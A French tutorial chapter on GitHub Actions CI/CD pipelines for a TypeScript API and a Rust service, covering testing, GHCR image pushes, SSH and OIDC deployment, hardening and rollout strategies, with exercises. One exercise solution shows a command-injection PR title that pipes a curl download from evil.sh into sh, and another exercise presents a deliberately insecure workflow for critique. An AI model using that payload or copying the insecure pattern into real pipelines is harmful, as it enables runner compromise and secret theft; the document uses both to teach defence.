# CI/CD GitHub Actions

Ce que tu vas apprendre : écrire un pipeline GitHub Actions complet pour une API TS et un service Rust (lint, tests avec Postgres, build et push d'image vers GHCR, déploiement), sécuriser les secrets avec OIDC et les environnements, et choisir une stratégie de déploiement.

## Le vocabulaire

- **Workflow** : un fichier `.github/workflows/*.yml`, déclenché par des **events** (`push`, `pull_request`, `workflow_dispatch`, `schedule`…).
- **Job** : un ensemble de steps qui tourne sur un **runner** (VM fraîche). Les jobs tournent **en parallèle** sauf `needs:`.
- **Step** : une commande (`run:`) ou une **action** réutilisable (`uses:`).
- **Artifact** : fichier passé entre jobs ou téléchargeable. **Cache** : accélère les runs suivants.

::: info Versions des actions
Les versions majeures ci-dessous sont celles de fin 2026 (`actions/checkout@v7`, `setup-node@v7`, `docker/build-push-action@v7`…). Laisse **Dependabot** (ou Renovate) les maintenir à jour plutôt que de les recopier d'un vieux blog.
:::

## Workflow CI : lint, test, build (TS)

```yaml
# .github/workflows/ci.yml
name: CI
on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read

concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true
```

`concurrency` annule le run précédent quand tu pushes à nouveau sur la même branche. `permissions` au niveau du workflow réduit le `GITHUB_TOKEN` au minimum.

```yaml
jobs:
  check:
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v7
      - uses: pnpm/action-setup@v6
      - uses: actions/setup-node@v7
        with:
          node-version-file: .nvmrc
          cache: pnpm
      - run: pnpm install --frozen-lockfile
      - run: pnpm lint
      - run: pnpm typecheck
      - run: pnpm test -- --coverage
      - run: pnpm build
```

- `pnpm/action-setup` lit la version dans `packageManager` de `package.json`.
- `cache: pnpm` met en cache le **store** pnpm, clé = hash de `pnpm-lock.yaml`.
- `timeout-minutes` : par défaut un job peut tourner **6 h**. Un test qui bloque te coûte des minutes facturées.
- Épingle l'OS (`ubuntu-24.04`) plutôt que `ubuntu-latest` si tu veux éviter les surprises lors de la bascule de l'alias.

## Services : Postgres dans la CI

Les tests d'intégration ont besoin d'une vraie DB. Les **service containers** tournent à côté du job :

```yaml
  integration:
    runs-on: ubuntu-24.04
    services:
      postgres:
        image: postgres:18
        env:
          POSTGRES_USER: app
          POSTGRES_PASSWORD: app
          POSTGRES_DB: billing_test
        ports: ["5432:5432"]
        options: >-
          --health-cmd "pg_isready -U app"
          --health-interval 5s
          --health-timeout 3s
          --health-retries 10
    env:
      DATABASE_URL: postgres://app:app@localhost:5432/billing_test
    steps:
      - uses: actions/checkout@v7
      - uses: pnpm/action-setup@v6
      - uses: actions/setup-node@v7
        with: { node-version-file: .nvmrc, cache: pnpm }
      - run: pnpm install --frozen-lockfile
      - run: pnpm db:migrate
      - run: pnpm test:integration
```

- Le job tourne **directement sur le runner** : Postgres est joignable via `localhost:5432` grâce à `ports`. (Si le job lui-même tournait dans un `container:`, on utiliserait `postgres:5432`.)
- Les `options` de healthcheck font **attendre** le runner avant les steps.
- Les migrations passent en CI à chaque PR : une migration cassée est détectée avant la prod.

## Matrices

Tester plusieurs versions ou OS en parallèle :

```yaml
  test:
    strategy:
      fail-fast: false
      matrix:
        node: [22, 24]
        os: [ubuntu-24.04]
        include:
          - node: 24
            os: ubuntu-24.04-arm
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@v7
      - uses: pnpm/action-setup@v6
      - uses: actions/setup-node@v7
        with: { node-version: "${{ matrix.node }}", cache: pnpm }
      - run: pnpm install --frozen-lockfile && pnpm test
```

`fail-fast: false` : un échec sur Node 22 n'annule pas Node 24 (tu vois tous les résultats). Une matrice sert surtout pour une **lib** ou un **CLI** distribué ; pour une API déployée sur une seule version de Node, teste **celle de la prod**.

## CI Rust

```yaml
  rust:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
      - uses: dtolnay/rust-toolchain@stable
        with:
          components: clippy, rustfmt
      - uses: Swatinem/rust-cache@v2
      - run: cargo fmt --all --check
      - run: cargo clippy --all-targets --locked -- -D warnings
      - run: cargo test --locked
```

- `Swatinem/rust-cache` met en cache `~/.cargo` et `target/` (clé = toolchain + `Cargo.lock`) : de 8 min à 1–2 min.
- `--locked` : échoue si `Cargo.lock` n'est pas à jour.
- Avec SQLx et ses macros `query!` vérifiées à la compilation : commite le dossier `.sqlx/` (`cargo sqlx prepare`) et mets `SQLX_OFFLINE=true` en CI, ou fournis une DB migrée via `services:` (cf. [API Axum + SQLx](/dev/rust/10-api-axum-sqlx)).

## Build et push d'image vers GHCR

GHCR (GitHub Container Registry) s'authentifie avec le `GITHUB_TOKEN` du run : **aucun secret à créer**.

```yaml
  image:
    needs: [check, integration]
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-24.04
    permissions:
      contents: read
      packages: write
    outputs:
      digest: ${{ steps.build.outputs.digest }}
    steps:
      - uses: actions/checkout@v7
      - uses: docker/setup-buildx-action@v4
      - uses: docker/login-action@v4
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
```

Puis les tags et le build avec le cache GitHub Actions :

```yaml
      - id: meta
        uses: docker/metadata-action@v6
        with:
          images: ghcr.io/${{ github.repository }}
          tags: |
            type=sha,format=long
            type=raw,value=main
      - id: build
        uses: docker/build-push-action@v7
        with:
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
```

- `type=sha` : tag immuable par commit (`sha-3f2c1a…`). C'est **ce tag** (ou le digest) que tu déploies, jamais `latest`.
- `cache-to: type=gha,mode=max` : les layers intermédiaires (deps, `cargo chef cook`) sont cachés entre runs.
- `metadata-action` met le nom d'image en minuscules (GHCR l'exige).

## Déploiement

### Environnements

Un **environment** GitHub (`Settings → Environments`) apporte :

- des **secrets propres** à l'environnement (`staging` ≠ `production`) ;
- des **protection rules** : reviewers obligatoires, délai d'attente, branches autorisées ;
- un historique des déploiements visible dans le repo.

```yaml
  deploy:
    needs: image
    runs-on: ubuntu-24.04
    environment:
      name: production
      url: https://api.exemple.fr
    concurrency:
      group: deploy-production
      cancel-in-progress: false
    steps:
      - name: Deploy over SSH
        env:
          SSH_KEY: ${{ secrets.DEPLOY_SSH_KEY }}
          HOST_KEY: ${{ secrets.DEPLOY_HOST_KEY }}
          TAG: sha-${{ github.sha }}
        run: |
          install -m 700 -d ~/.ssh
          echo "$SSH_KEY" > ~/.ssh/id_ed25519
          chmod 600 ~/.ssh/id_ed25519
          echo "$HOST_KEY" >> ~/.ssh/known_hosts
          # clé restreinte côté serveur : command= force deploy.sh
          ssh deploy@api.exemple.fr "$TAG"
```

- `concurrency` avec `cancel-in-progress: false` : deux déploiements ne se marchent pas dessus, et on n'en interrompt pas un en plein milieu.
- `HOST_KEY` dans `known_hosts` : pas de `StrictHostKeyChecking=no` (qui ouvre la porte au man-in-the-middle).
- Le script `deploy.sh` côté serveur (pull, migrations, restart, healthcheck) est détaillé dans [Déployer une vraie app](/infra/11-deployer-une-vraie-app).

### Secrets et OIDC

Les **secrets** GitHub (`secrets.X`) sont chiffrés, masqués dans les logs, et **pas transmis** aux workflows déclenchés par des PR de forks.

Mais une clé d'accès cloud longue durée (`AWS_ACCESS_KEY_ID`) dans les secrets reste un risque : elle n'expire jamais, et fuit si un step la logue ou si une action tierce est compromise. **OIDC** la remplace :

1. Le job demande à GitHub un **JWT** signé décrivant le run (repo, branche, environment).
2. Le cloud (AWS, GCP, Azure, Scaleway…) vérifie le JWT et délivre des credentials **temporaires** (~1 h).
3. La politique de confiance côté cloud limite à `repo:acme/billing-api:environment:production`.

```yaml
  deploy-aws:
    environment: production
    permissions:
      id-token: write
      contents: read
    runs-on: ubuntu-24.04
    steps:
      - uses: aws-actions/configure-aws-credentials@v6
        with:
          role-to-assume: arn:aws:iam::123456789012:role/deploy
          aws-region: eu-west-3
      - run: aws ecs update-service --cluster prod --service api --force-new-deployment
```

Zéro secret stocké. `id-token: write` est **nécessaire** pour obtenir le JWT.

### Durcir le pipeline

- `permissions:` minimal au niveau workflow, élargi par job.
- Épingle les actions tierces par **SHA** (`uses: owner/action@<sha40> # v1.2.3`) : un tag peut être déplacé par un attaquant (c'est arrivé avec `tj-actions/changed-files` en 2025).
- Méfie-toi de `pull_request_target` : il tourne avec les secrets **et** peut checkout le code d'un fork.
- N'interpole jamais <span v-pre>`${{ github.event.pull_request.title }}`</span> directement dans un `run:` : injection de commande. Passe par `env:`.

## Stratégies de déploiement

| Stratégie | Principe | Rollback | Coût |
|---|---|---|---|
| Recreate | Stop v1, start v2 | Lent | Downtime |
| Rolling | Remplace les instances une à une | Moyen | Faible |
| Blue/green | v2 à côté de v1, bascule du trafic | Instantané | 2× infra |
| Canary | x % du trafic sur v2, puis augmente | Rapide | Outillage |

- **Rolling** : défaut de Kubernetes. Pendant le rollout, v1 et v2 tournent **en même temps** : les deux versions doivent être compatibles avec le schéma DB.
- **Blue/green** : sur un VPS, deux conteneurs `api-blue`/`api-green` et le reverse proxy pointe sur l'un ou l'autre. Rollback = re-pointer.
- **Canary** : on compare taux d'erreur et latence de v2 vs v1 avant d'élargir. Demande des métriques par version (cf. [Observabilité](/infra/08-observabilite)) et un routeur capable de pondérer (Ingress, service mesh, LB cloud).
- **Feature flags** : découplent le déploiement (code en prod, éteint) de la release (activé pour 5 % des clients). Souvent plus simple qu'un canary d'infra.

::: warning Migrations et compatibilité
Quelle que soit la stratégie, ancien et nouveau code coexistent un moment. Applique le pattern **expand / contract** : ajouter la colonne (nullable) → déployer le code qui écrit les deux → backfill → code qui lit la nouvelle → supprimer l'ancienne dans un déploiement **ultérieur**. Détails dans [Migrations & ORM en prod](/bdd/08-migrations-orm-en-prod).
:::

## Cas réel

Le pipeline de `billing-api` avant refonte : un seul job de 14 min, `ubuntu-latest`, `npm install` sans cache, image taggée `latest`, déploiement via un secret `SSH_PASSWORD` sur `push` vers `main`, sans validation.

Après :

1. `check` (lint + typecheck + unit) et `integration` (Postgres en service) **en parallèle** : 3 min.
2. `image` seulement sur `main`, tag `sha-…`, cache `gha` : 1 min 30.
3. `deploy-staging` automatique, puis smoke test (`curl -f https://staging…/health`).
4. `deploy-production` derrière l'environment `production` avec **un reviewer obligatoire**.
5. Clé SSH dédiée au déploiement, restreinte par une option `command=` dans `authorized_keys` côté serveur (détail dans le chapitre 11) : la clé ne peut **que** déployer.

Rollback : relancer le job `deploy` d'un ancien run (`Re-run job`), qui redéploie l'image `sha-…` de ce commit. 2 minutes.

## Pièges classiques

- Déployer `:latest` : impossible de savoir ce qui tourne, impossible de revenir à « la version d'avant ».
- `permissions` par défaut trop larges, actions tierces non épinglées.
- Secrets affichés via `set -x` ou `echo` (le masquage ne marche pas sur les valeurs transformées, base64 par ex.).
- Cache trop large (`node_modules` + clé fixe) : builds qui passent en CI et cassent ailleurs.
- Tests d'intégration contre une DB partagée de staging : tests flaky, données polluées.
- Pas de `concurrency` sur le déploiement : deux merges rapprochés = deux déploiements simultanés.
- `StrictHostKeyChecking=no` dans le step SSH.

## Défis

**1. Trouve les 6 problèmes dans ce workflow.**

```yaml
name: deploy
on: [push]
jobs:
  all:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@main
      - run: npm install && npm test
      - run: docker build -t ghcr.io/acme/api:latest .
      - run: echo ${{ secrets.GHCR_PAT }} | docker login ghcr.io -u bot --password-stdin
      - run: docker push ghcr.io/acme/api:latest
      - run: sshpass -p ${{ secrets.ROOT_PASSWORD }} ssh -o StrictHostKeyChecking=no root@1.2.3.4 "docker pull ghcr.io/acme/api:latest && docker restart api"
```

::: details Solution
1. `on: [push]` sur **toutes** les branches : chaque branche de feature déploie en prod. → build sur PR, déploiement seulement sur `main`, derrière un `environment`.
2. `actions/checkout@main` : version mouvante. → `@v7` (ou SHA).
3. `npm install` au lieu de `pnpm install --frozen-lockfile` / `npm ci`, sans cache.
4. Tag `latest` : pas de traçabilité ni de rollback. → <span v-pre>`sha-${{ github.sha }}`</span>.
5. PAT personnel pour GHCR alors que `GITHUB_TOKEN` + `permissions: packages: write` suffit. Et pas de `permissions:` du tout.
6. SSH en **root** avec **mot de passe**, `StrictHostKeyChecking=no` : clé dédiée, user `deploy`, `known_hosts` fixé. Et `docker restart` ne recharge **pas** la nouvelle image (il redémarre le même conteneur) : il faut recréer (`docker compose up -d`).

Bonus : tout dans un seul job, pas de `concurrency`, pas de healthcheck post-déploiement.
:::

**2. Postgres injoignable en CI.** Le job d'intégration échoue : `connect ECONNREFUSED 127.0.0.1:5432`, au tout premier test. Le bloc `services` déclare Postgres **sans** `ports` ni `options`. Explique les deux problèmes.

::: details Solution
1. Sans `ports: ["5432:5432"]`, le conteneur n'est pas publié sur le runner : `localhost:5432` ne mène nulle part (le nom `postgres` ne marche que si le job tourne lui-même dans un `container:`).
2. Sans `--health-cmd`, le runner n'attend pas que Postgres soit prêt : même avec le port, les premières connexions peuvent échouer pendant l'init.

Ajouter `ports` + les `options` de healthcheck.
:::

**3. Écris le job.** Sur chaque tag `v*.*.*`, construire l'image du service Rust `ingest` et la pousser sur GHCR avec les tags `1.4.2`, `1.4` et `sha-…`. Uniquement les steps clés.

::: details Solution
```yaml
on:
  push:
    tags: ["v*.*.*"]
jobs:
  release:
    runs-on: ubuntu-24.04
    permissions: { contents: read, packages: write }
    steps:
      - uses: actions/checkout@v7
      - uses: docker/setup-buildx-action@v4
      - uses: docker/login-action@v4
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - id: meta
        uses: docker/metadata-action@v6
        with:
          images: ghcr.io/${{ github.repository }}
          tags: |
            type=semver,pattern={{version}}
            type=semver,pattern={{major}}.{{minor}}
            type=sha
      - uses: docker/build-push-action@v7
        with:
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
```
:::

**4. Injection.** Ce step affiche le titre de la PR : <span v-pre>`run: echo "Titre de la PR ${{ github.event.pull_request.title }}"`</span>. Pourquoi est-ce dangereux, et comment l'écrire ?

::: details Solution
<span v-pre>`${{ }}`</span> est remplacé **avant** l'exécution du shell : un titre comme `"; curl https://evil.sh | sh; echo "` devient du code exécuté sur le runner, avec accès au `GITHUB_TOKEN` et aux secrets du job.

```yaml
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Titre de la PR $PR_TITLE"
```

La valeur passe par une variable d'environnement, le shell ne l'interprète pas comme du code.
:::

**5. Choisis la stratégie.** Pour chaque cas : a) un worker de jobs qui consomme une queue Redis ; b) une API de paiement avec un gros refacto du calcul de TVA ; c) un VPS unique avec Compose, où 5 s de coupure sont tolérées la nuit mais pas en journée.

::: details Solution
- a) **Rolling** simple : les workers sont interchangeables. Il faut juste qu'ils gèrent SIGTERM (finir ou rendre le job en cours) et que les jobs soient idempotents.
- b) **Canary** (ou feature flag par client) : 1 % du trafic, comparaison du taux d'erreur et des montants calculés, puis élargir. Rollback instantané en cas d'écart. Bonus : shadow mode (calculer avec les deux, logguer les différences).
- c) **Blue/green** sur la même machine : démarrer `api-green`, attendre le healthcheck, basculer l'upstream du reverse proxy (Caddy recharge sans couper), arrêter `api-blue`. Zéro coupure, rollback = re-basculer.
:::

## À retenir

- Jobs parallèles, `concurrency`, `timeout-minutes`, `permissions` minimales.
- Postgres en `services:` avec healthcheck pour des tests d'intégration fiables, migrations comprises.
- Image taggée par SHA, poussée sur GHCR avec `GITHUB_TOKEN`, cache `type=gha`.
- Environnements GitHub pour séparer secrets et exiger une validation en prod.
- OIDC plutôt que des clés cloud longue durée ; actions tierces épinglées par SHA.
- Rolling, blue/green, canary : tous exigent que v1 et v2 cohabitent avec le même schéma DB.
